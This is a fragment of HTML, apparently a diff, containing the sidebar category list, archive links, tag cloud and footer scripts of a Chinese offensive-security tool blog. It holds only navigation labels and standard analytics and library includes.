class="fa" aria-hidden="true">DLL劫持</i></a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/EXP/"><i class="fa" aria-hidden="true">EXP</i></a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Exp/"><i class="fa" aria-hidden="true">Exp</i></a><span class="category-list-count">22</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/GetShell/"><i class="fa" aria-hidden="true">GetShell</i></a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Kali/"><i class="fa" aria-hidden="true">Kali</i></a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Key/"><i class="fa" aria-hidden="true">Key</i></a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/LPE/"><i class="fa" aria-hidden="true">LPE</i></a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Ladon/"><i class="fa" aria-hidden="true">Ladon</i></a><span class="category-list-count">100</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/LadonGo/"><i class="fa" aria-hidden="true">LadonGo</i></a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Metasploit/"><i class="fa" aria-hidden="true">Metasploit</i></a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/PowerShell/"><i class="fa" aria-hidden="true">PowerShell</i></a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Python/"><i class="fa" aria-hidden="true">Python</i></a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/RCE/"><i class="fa" aria-hidden="true">RCE</i></a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Rat/"><i class="fa" aria-hidden="true">Rat</i></a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Router/"><i class="fa" aria-hidden="true">Router</i></a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/ShellCode/"><i class="fa" aria-hidden="true">ShellCode</i></a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/SubDomain/"><i class="fa" aria-hidden="true">SubDomain</i></a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Tool/"><i class="fa" aria-hidden="true">Tool</i></a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/WebShell/"><i class="fa" aria-hidden="true">WebShell</i></a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/cve-2023-36802/"><i class="fa" aria-hidden="true">cve-2023-36802</i></a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/exp/"><i class="fa" aria-hidden="true">exp</i></a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/tool/"><i class="fa" aria-hidden="true">tool</i></a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/OnlinePC/"><i class="fa" aria-hidden="true">主机发现</i></a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Discover/"><i class="fa" aria-hidden="true">信息收集</i></a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/bypassAV/"><i class="fa" aria-hidden="true">免杀</i></a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Lan-Pentest/"><i class="fa" aria-hidden="true">内网渗透</i></a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Sniffer/"><i class="fa" aria-hidden="true">嗅探</i></a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Pass/"><i class="fa" aria-hidden="true">密码</i></a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Brute-Force/"><i class="fa" aria-hidden="true">密码爆破</i></a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Tool/"><i class="fa" aria-hidden="true">工具</i></a><span class="category-list-count">30</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Persistence/"><i class="fa" aria-hidden="true">持久化</i></a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Lpe/"><i class="fa" aria-hidden="true">提权</i></a><span class="category-list-count">12</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Code/"><i class="fa" aria-hidden="true">源码</i></a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Program/"><i class="fa" aria-hidden="true">编程</i></a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Rce/"><i class="fa" aria-hidden="true">远程执行</i></a><span class="category-list-count">5</span></li></ul>
+</div>
+
+    
+    
+<div class="widget">
+    <h3 class="title">
+        Archives
+    </h3>
+    <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/04/"><i class="fa" aria-hidden="true">2025年04月</i></a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/12/"><i class="fa" aria-hidden="true">2024年12月</i></a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/11/"><i class="fa" aria-hidden="true">2024年11月</i></a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/10/"><i class="fa" aria-hidden="true">2024年10月</i></a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/08/"><i class="fa" aria-hidden="true">2024年08月</i></a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/01/"><i class="fa" aria-hidden="true">2024年01月</i></a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/"><i class="fa" aria-hidden="true">2023年12月</i></a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/"><i class="fa" aria-hidden="true">2023年11月</i></a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/06/"><i class="fa" aria-hidden="true">2023年06月</i></a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/"><i class="fa" aria-hidden="true">2023年05月</i></a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/"><i class="fa" aria-hidden="true">2023年04月</i></a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/"><i class="fa" aria-hidden="true">2023年03月</i></a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/02/"><i class="fa" aria-hidden="true">2023年02月</i></a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/12/"><i class="fa" aria-hidden="true">2022年12月</i></a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/10/"><i class="fa" aria-hidden="true">2022年10月</i></a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/09/"><i class="fa" aria-hidden="true">2022年09月</i></a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/"><i class="fa" aria-hidden="true">2021年12月</i></a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/"><i class="fa" aria-hidden="true">2021年10月</i></a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/"><i class="fa" aria-hidden="true">2021年09月</i></a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/"><i class="fa" aria-hidden="true">2021年08月</i></a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/"><i class="fa" aria-hidden="true">2021年07月</i></a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/"><i class="fa" aria-hidden="true">2021年06月</i></a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/"><i class="fa" aria-hidden="true">2021年05月</i></a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/"><i class="fa" aria-hidden="true">2021年04月</i></a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/"><i class="fa" aria-hidden="true">2021年03月</i></a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/"><i class="fa" aria-hidden="true">2021年02月</i></a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/"><i class="fa" aria-hidden="true">2021年01月</i></a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/"><i class="fa" aria-hidden="true">2020年12月</i></a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/"><i class="fa" aria-hidden="true">2020年11月</i></a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/"><i class="fa" aria-hidden="true">2020年10月</i></a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/"><i class="fa" aria-hidden="true">2020年09月</i></a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/"><i class="fa" aria-hidden="true">2020年08月</i></a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/"><i class="fa" aria-hidden="true">2020年07月</i></a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/"><i class="fa" aria-hidden="true">2020年06月</i></a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/"><i class="fa" aria-hidden="true">2020年05月</i></a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/"><i class="fa" aria-hidden="true">2020年04月</i></a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/"><i class="fa" aria-hidden="true">2020年03月</i></a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/"><i class="fa" aria-hidden="true">2020年01月</i></a><span class="archive-list-count">9</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/"><i class="fa" aria-hidden="true">2019年12月</i></a><span class="archive-list-count">26</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/"><i class="fa" aria-hidden="true">2019年09月</i></a><span class="archive-list-count">1</span></li></ul>
+</div>
+
+    
+    
+<div class="widget">
+    <h3 class="title">
+        Tag Cloud
+    </h3>
+    <div class="content tag-cloud">
+        
+        <a href="/tags/Dotnet/" style="font-size: 12.73px;">.NET</a> <a href="/tags/0day/" style="font-size: 10.91px;">0day</a> <a href="/tags/ActiveMQ/" style="font-size: 10px;">ActiveMQ</a> <a href="/tags/Apache/" style="font-size: 10px;">Apache</a> <a href="/tags/Apache-Solr/" style="font-size: 10px;">Apache Solr</a> <a href="/tags/Brute/" style="font-size: 13.64px;">Brute</a> <a href="/tags/BypassAV/" style="font-size: 10px;">BypassAV</a> <a href="/tags/BypassUAC/" style="font-size: 10px;">BypassUAC</a> <a href="/tags/C/" style="font-size: 10.91px;">C#</a> <a href="/tags/CMS/" style="font-size: 10px;">CMS</a> <a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/CVE-2016-3088/" style="font-size: 10px;">CVE-2016-3088</a> <a href="/tags/CVE-2018-7600/" style="font-size: 10px;">CVE-2018-7600</a> <a href="/tags/CVE-2019-11043/" style="font-size: 10px;">CVE-2019-11043</a> <a href="/tags/CVE-2019-13272/" style="font-size: 10px;">CVE-2019-13272</a> <a href="/tags/CVE-2020-0688/" style="font-size: 10px;">CVE-2020-0688</a> <a href="/tags/CVE-2020-0796/" style="font-size: 10px;">CVE-2020-0796</a> <a href="/tags/CVE-2020-1472/" style="font-size: 10px;">CVE-2020-1472</a> <a href="/tags/CVE-2020-17144/" style="font-size: 10.91px;">CVE-2020-17144</a> <a href="/tags/CVE-2021-36934/" style="font-size: 10px;">CVE-2021-36934</a> <a href="/tags/CVE-2021-40444/" style="font-size: 10px;">CVE-2021-40444</a> <a href="/tags/CVE-2023-21839/" style="font-size: 10px;">CVE-2023-21839</a> <a href="/tags/CVE-2024-29973/" style="font-size: 10px;">CVE-2024-29973</a> <a href="/tags/CVE-2024-45216/" style="font-size: 10px;">CVE-2024-45216</a> <a href="/tags/CVE-2024-47575/" style="font-size: 10px;">CVE-2024-47575</a> <a href="/tags/CmdShell/" style="font-size: 10px;">CmdShell</a> <a href="/tags/CS/" style="font-size: 17.27px;">Cobalt Strike</a> <a href="/tags/Code/" style="font-size: 13.64px;">Code</a> <a href="/tags/DLL/" style="font-size: 10px;">DLL</a> <a href="/tags/DeepSeek/" style="font-size: 10px;">DeepSeek</a> <a href="/tags/DllHijack/" style="font-size: 10.91px;">DllHijack</a> <a href="/tags/Drupal/" style="font-size: 10px;">Drupal</a> <a href="/tags/EXP/" style="font-size: 12.73px;">EXP</a> <a href="/tags/Exchange/" style="font-size: 12.73px;">Exchange</a> <a href="/tags/Exp/" style="font-size: 18.18px;">Exp</a> <a href="/tags/FortiManager/" style="font-size: 10px;">FortiManager</a> <a href="/tags/FtpSniffer/" style="font-size: 10px;">FtpSniffer</a> <a href="/tags/GetShell/" style="font-size: 16.36px;">GetShell</a> <a href="/tags/Gh0st/" style="font-size: 10px;">Gh0st</a> <a href="/tags/HttpSniffer/" style="font-size: 10px;">HttpSniffer</a> <a href="/tags/IIS/" style="font-size: 11.82px;">IIS</a> <a href="/tags/JAVA/" style="font-size: 10px;">JAVA</a> <a href="/tags/K8tools/" style="font-size: 10px;">K8tools</a> <a href="/tags/K8fly/" style="font-size: 10px;">K8飞刀</a> <a href="/tags/Kali/" style="font-size: 12.73px;">Kali</a> <a href="/tags/Key/" style="font-size: 10.91px;">Key</a> <a href="/tags/LDAP/" style="font-size: 10px;">LDAP</a> <a href="/tags/LPE/" style="font-size: 15.45px;">LPE</a> <a href="/tags/Ladon/" style="font-size: 20px;">Ladon</a> <a href="/tags/LadonGo/" style="font-size: 12.73px;">LadonGo</a> <a href="/tags/Log4j2/" style="font-size: 10px;">Log4j2</a> <a href="/tags/MS17010/" style="font-size: 11.82px;">MS17010</a> <a href="/tags/MSF/" style="font-size: 10px;">MSF</a> <a href="/tags/Metasploit/" style="font-size: 12.73px;">Metasploit</a> <a href="/tags/Mikrotik/" style="font-size: 10px;">Mikrotik</a> <a href="/tags/Moudle/" style="font-size: 10.91px;">Moudle</a> <a href="/tags/Ngnix/" style="font-size: 10px;">Ngnix</a> <a href="/tags/OXID/" style="font-size: 10px;">OXID</a> <a href="/tags/OpCode/" style="font-size: 10px;">OpCode</a> <a href="/tags/Overflow/" style="font-size: 10px;">Overflow</a> <a href="/tags/PHP/" style="font-size: 10px;">PHP</a> <a href="/tags/Pass/" style="font-size: 10px;">Pass</a> <a href="/tags/Password/" style="font-size: 10.91px;">Password</a> <a href="/tags/Payload/" style="font-size: 10px;">Payload</a> <a href="/tags/PhpStudy/" style="font-size: 10.91px;">PhpStudy</a> <a href="/tags/Poc/" style="font-size: 10.91px;">Poc</a> <a href="/tags/PortScan/" style="font-size: 10px;">PortScan</a> <a href="/tags/PortTran/" style="font-size: 10px;">PortTran</a> <a href="/tags/PowerShell/" style="font-size: 14.55px;">PowerShell</a> <a href="/tags/Proxy/" style="font-size: 10px;">Proxy</a> <a href="/tags/Python/" style="font-size: 11.82px;">Python</a> <a href="/tags/Qwen-2-5/" style="font-size: 10px;">Qwen 2.5</a> <a href="/tags/RCE/" style="font-size: 10.91px;">RCE</a> <a href="/tags/Rat/" style="font-size: 10px;">Rat</a> <a href="/tags/Rce/" style="font-size: 11.82px;">Rce</a> <a href="/tags/RouterOS/" style="font-size: 10.91px;">RouterOS</a> <a href="/tags/SMB/" style="font-size: 10px;">SMB</a> <a href="/tags/SMBGhost/" style="font-size: 10px;">SMBGhost</a> <a href="/tags/SQL/" style="font-size: 10px;">SQL</a> <a href="/tags/Scanner/" style="font-size: 11.82px;">Scanner</a> <a href="/tags/Sharp/" style="font-size: 10px;">Sharp</a> <a href="/tags/ShellCode/" style="font-size: 10px;">ShellCode</a> <a href="/tags/Shiro/" style="font-size: 10px;">Shiro</a> <a href="/tags/Sniffer/" style="font-size: 10px;">Sniffer</a> <a href="/tags/Solr/" style="font-size: 10px;">Solr</a> <a href="/tags/Struts2/" style="font-size: 10px;">Struts2</a> <a href="/tags/Study/" style="font-size: 10px;">Study</a> <a href="/tags/SubDomain/" style="font-size: 10.91px;">SubDomain</a> <a href="/tags/ThinkPHP/" style="font-size: 10px;">ThinkPHP</a> <a href="/tags/Tool/" style="font-size: 19.09px;">Tool</a> <a href="/tags/USB/" style="font-size: 10px;">USB</a> <a href="/tags/Ubuntu/" style="font-size: 10px;">Ubuntu</a> <a href="/tags/Vmware/" style="font-size: 10.91px;">Vmware</a> <a href="/tags/WebScan/" style="font-size: 10px;">WebScan</a> <a href="/tags/WebShell/" style="font-size: 11.82px;">WebShell</a> <a href="/tags/Weblogic/" style="font-size: 10.91px;">Weblogic</a> <a href="/tags/Zimbra/" style="font-size: 10px;">Zimbra</a> <a href="/tags/Zyxel/" style="font-size: 10px;">Zyxel</a> <a href="/tags/brute-force/" style="font-size: 10.91px;">brute force</a> <a href="/tags/bypassUAC/" style="font-size: 10px;">bypassUAC</a> <a href="/tags/diypoc/" style="font-size: 10px;">diypoc</a> <a href="/tags/dll/" style="font-size: 10px;">dll</a> <a href="/tags/edr/" style="font-size: 10px;">edr</a> <a href="/tags/hta/" style="font-size: 10px;">hta</a> <a href="/tags/ladon/" style="font-size: 10px;">ladon</a> <a href="/tags/lpe/" style="font-size: 10.91px;">lpe</a> <a href="/tags/meterpreter/" style="font-size: 10px;">meterpreter</a> <a href="/tags/mikrotik/" style="font-size: 10px;">mikrotik</a> <a href="/tags/mimikatz/" style="font-size: 10px;">mimikatz</a> <a href="/tags/netbios/" style="font-size: 10px;">netbios</a> <a href="/tags/netcat/" style="font-size: 10px;">netcat</a> <a href="/tags/netsh/" style="font-size: 11.82px;">netsh</a> <a href="/tags/ntlm/" style="font-size: 10px;">ntlm</a> <a href="/tags/porttran/" style="font-size: 10px;">porttran</a> <a href="/tags/quasar/" style="font-size: 10px;">quasar</a> <a href="/tags/rat/" style="font-size: 10px;">rat</a> <a href="/tags/runas/" style="font-size: 10px;">runas</a> <a href="/tags/ssh/" style="font-size: 10px;">ssh</a> <a href="/tags/waf/" style="font-size: 10px;">waf</a> <a href="/tags/webser/" style="font-size: 10px;">webser</a> <a href="/tags/wmi/" style="font-size: 11.82px;">wmi</a> <a href="/tags/ysoserial/" style="font-size: 10px;">ysoserial</a> <a href="/tags/Discover/" style="font-size: 11.82px;">信息收集</a> <a href="/tags/bypassAV/" style="font-size: 10px;">免杀</a> <a href="/tags/Lan-Pentest/" style="font-size: 10.91px;">内网渗透</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 10px;">反序列化</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E5%9B%9E%E6%98%BE/" style="font-size: 10px;">命令回显</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 10.91px;">命令执行</a> <a href="/tags/%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83/" style="font-size: 10px;">域控提权</a> <a href="/tags/Lpe/" style="font-size: 10px;">本地提权</a>
+        
+    </div>
+</div>
+
+    
+    
+    
+</aside>
+
+                
+            </div>
+        </div>
+    </section>
+    <footer class="main-footer">
+    <div class="container">
+        <div class="row">
+        </div>
+    </div>
+</footer>
+<a id="back-to-top" class="icon-btn hide">
+    <i class="fa fa-chevron-up"></i>
+</a>
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?0f0409af9df7ad2cc43cc334b4d9b515";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+ <script type="text/javascript" src="http://libs.baidu.com/jquery/1.11.1/jquery.min.js"></script>
+ <script src="https://cdn.bootcdn.net/ajax/libs/lazysizes/5.3.2/lazysizes.min.js" async=""></script>
+
+    <div class="copyright">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="busuanzi">
+    
+    Total:
+    <strong id="busuanzi_value_site_pv">
+        <i class="fa fa-spinner fa-spin"></i>
+    </strong>
+	<!-- 
+    &nbsp; | &nbsp;
+    
+	Visitors:
+    <strong id="busuanzi_value_site_uv">
+        <i class="fa fa-spinner fa-spin"></i> 
+    </strong>
+	-->
+    
+</div>
+            </div>
+            <div class="col-sm-12">
+                <span>Copyright ©
+                    2020
+                    
+                </span> |
+                <span>
+                    Powered by <a href="//k8gege.org" class="copyright-links" target="_blank" rel="nofollow">K8gege</a>
+                </span>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+<script src="/js/search.js?rev=@@hash.js"></script>
+
+
+
+
+<script async="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+<script src="/js/app.js?rev=@@hash.js"></script>
+
+
+</body></html>
